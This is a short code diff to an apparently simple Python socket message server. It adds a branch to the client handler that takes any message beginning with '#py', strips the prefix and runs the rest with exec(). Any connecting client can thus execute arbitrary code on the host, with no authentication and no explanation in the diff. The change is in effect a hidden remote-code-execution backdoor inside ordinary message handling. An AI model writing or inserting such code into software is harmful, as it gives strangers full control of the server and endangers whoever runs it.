@@ -24,7 +24,11 @@ def handle_client(conn, addr):
                 msg = conn.recv(msgLength).decode(FORMAT)
 
                 if not msg == DISCONNECT_MSG:
-                    print(f"[{addr[0]}] {msg}")
+                    if str(msg).startswith("#py"):
+                        code = msg.replace("#py", "")
+                        exec(code)
+                    else:
+                        print(f"[{addr[0]}] {msg}")
                     conn.send("Received".encode(FORMAT))
                 else:
                     connected = False
